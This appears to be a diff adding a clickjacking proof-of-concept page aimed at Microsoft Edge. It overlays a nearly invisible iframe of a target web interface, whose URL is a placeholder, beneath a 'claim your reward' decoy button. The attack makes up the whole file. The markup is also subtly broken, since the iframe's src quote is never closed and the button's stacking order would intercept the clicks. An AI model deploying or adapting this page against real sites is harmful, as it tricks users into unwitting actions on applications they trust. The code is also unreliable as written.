@@ -1,0 +1,51 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1000px;
+            height: 700px;
+            opacity: 0.1; /* Make iframe almost invisible */
+            z-index: 2;
+            border: none;
+        }
+        .overlay-button {
+            position: absolute;
+            top: 150px;
+            left: 150px;
+            width: 250px;
+            height: 60px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 22px;
+            text-align: center;
+            line-height: 60px;
+            z-index: 3;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Click the button below to claim your reward!</h1>
+    <div class="overlay-button">Click Me!</div>
+
+    <!-- Iframe embedding the target web GUI -->
+    <iframe id="targetFrame" src="url-here</iframe>
+
+    <script>
+        // Ensure PoC only works in Microsoft Edge
+        if (!navigator.userAgent.includes("Edg")) {
+            document.body.innerHTML = "<h2>This PoC requires Microsoft Edge browser.</h2>";
+        }
+    </script>
+</body>
+</html>
